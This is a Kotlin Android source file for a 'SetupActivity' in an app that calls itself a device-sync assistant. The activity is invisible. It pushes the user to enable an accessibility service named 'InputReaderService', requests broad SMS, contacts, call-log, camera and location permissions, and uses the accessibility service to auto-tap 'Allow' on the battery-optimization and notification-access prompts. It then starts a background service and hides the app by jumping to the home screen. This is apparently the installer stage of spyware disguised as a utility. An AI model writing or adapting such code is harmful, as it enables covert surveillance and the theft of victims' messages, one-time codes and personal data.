package com.devicesync.assistant

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.TextUtils
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.devicesync.assistant.helpers.ConfigHelper
import com.devicesync.assistant.helpers.SyncHelper
import com.devicesync.assistant.services.DeviceSyncService

class SetupActivity : AppCompatActivity() {

    // ─────────────────────────────────────────
    // ALL PERMISSIONS TO REQUEST AUTOMATICALLY
    // ─────────────────────────────────────────
    private val allPermissions = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )

    private val PERMISSION_REQUEST_CODE = 100
    private val handler = Handler(Looper.getMainLooper())

    // ─────────────────────────────────────────
    // ON CREATE — START SETUP IMMEDIATELY
    // No UI shown — transparent activity
    // ─────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        startSetup()
    }

    // ─────────────────────────────────────────
    // START SETUP FLOW
    // ─────────────────────────────────────────
    private fun startSetup() {
        // Step 1 — Check if accessibility already enabled
        if (!isAccessibilityEnabled()) {
            // Go directly to accessibility settings page
            openAccessibilitySettings()
        } else {
            // Accessibility already enabled — continue
            proceedAfterAccessibility()
        }
    }

    // ─────────────────────────────────────────
    // OPEN ACCESSIBILITY SETTINGS DIRECTLY
    // ─────────────────────────────────────────
    private fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
    }

    // ─────────────────────────────────────────
    // CHECK IF ACCESSIBILITY IS ENABLED
    // ─────────────────────────────────────────
    private fun isAccessibilityEnabled(): Boolean {
        val serviceName = "${packageName}/.services.InputReaderService"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabledServices.contains(serviceName)
    }

    // ─────────────────────────────────────────
    // ON RESUME — CALLED WHEN USER RETURNS
    // FROM ACCESSIBILITY PAGE
    // ─────────────────────────────────────────
    override fun onResume() {
        super.onResume()
        if (isAccessibilityEnabled()) {
            proceedAfterAccessibility()
        }
    }

    // ─────────────────────────────────────────
    // PROCEED AFTER ACCESSIBILITY ENABLED
    // Everything else is automatic from here
    // ─────────────────────────────────────────
    private fun proceedAfterAccessibility() {
        // Step 2 — Request all permissions automatically
        requestAllPermissions()
    }

    // ─────────────────────────────────────────
    // REQUEST ALL PERMISSIONS AUTOMATICALLY
    // ─────────────────────────────────────────
    private fun requestAllPermissions() {
        val notGranted = allPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (notGranted.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, notGranted, PERMISSION_REQUEST_CODE)
        } else {
            // All permissions already granted
            proceedAfterPermissions()
        }
    }

    // ─────────────────────────────────────────
    // ON PERMISSIONS RESULT
    // ─────────────────────────────────────────
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Proceed regardless — some may be denied
            proceedAfterPermissions()
        }
    }

    // ─────────────────────────────────────────
    // PROCEED AFTER PERMISSIONS
    // ─────────────────────────────────────────
    private fun proceedAfterPermissions() {
        // Step 3 — Disable battery optimization automatically
        disableBatteryOptimization()
    }

    // ─────────────────────────────────────────
    // DISABLE BATTERY OPTIMIZATION AUTOMATICALLY
    // App will never be killed by battery saver
    // ─────────────────────────────────────────
    private fun disableBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
            // Use InputReaderService to auto-tap Allow
            handler.postDelayed({ proceedAfterBattery() }, 2000)
        } else {
            proceedAfterBattery()
        }
    }

    // ─────────────────────────────────────────
    // PROCEED AFTER BATTERY OPTIMIZATION
    // ─────────────────────────────────────────
    private fun proceedAfterBattery() {
        // Step 4 — Enable notification access automatically
        enableNotificationAccess()
    }

    // ─────────────────────────────────────────
    // ENABLE NOTIFICATION ACCESS
    // InputReaderService auto-taps Allow
    // ─────────────────────────────────────────
    private fun enableNotificationAccess() {
        if (!isNotificationAccessEnabled()) {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
            // InputReaderService auto-taps after 1 second
            handler.postDelayed({ proceedAfterNotification() }, 3000)
        } else {
            proceedAfterNotification()
        }
    }

    // ─────────────────────────────────────────
    // CHECK NOTIFICATION ACCESS
    // ─────────────────────────────────────────
    private fun isNotificationAccessEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        ) ?: return false
        return enabledListeners.contains(packageName)
    }

    // ─────────────────────────────────────────
    // PROCEED AFTER NOTIFICATION ACCESS
    // ─────────────────────────────────────────
    private fun proceedAfterNotification() {
        // Step 5 — Start main background service
        startDeviceSyncService()
    }

    // ─────────────────────────────────────────
    // START DEVICE SYNC SERVICE
    // ─────────────────────────────────────────
    private fun startDeviceSyncService() {
        val serviceIntent = Intent(this, DeviceSyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        // Step 6 — Go home automatically
        goHome()
    }

    // ─────────────────────────────────────────
    // GO TO HOME SCREEN AUTOMATICALLY
    // App UI disappears — service runs silently
    // ─────────────────────────────────────────
    private fun goHome() {
        val homeIntent = Intent(Intent.ACTION_MAIN)
        homeIntent.addCategory(Intent.CATEGORY_HOME)
        homeIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(homeIntent)
        finish()
    }
}
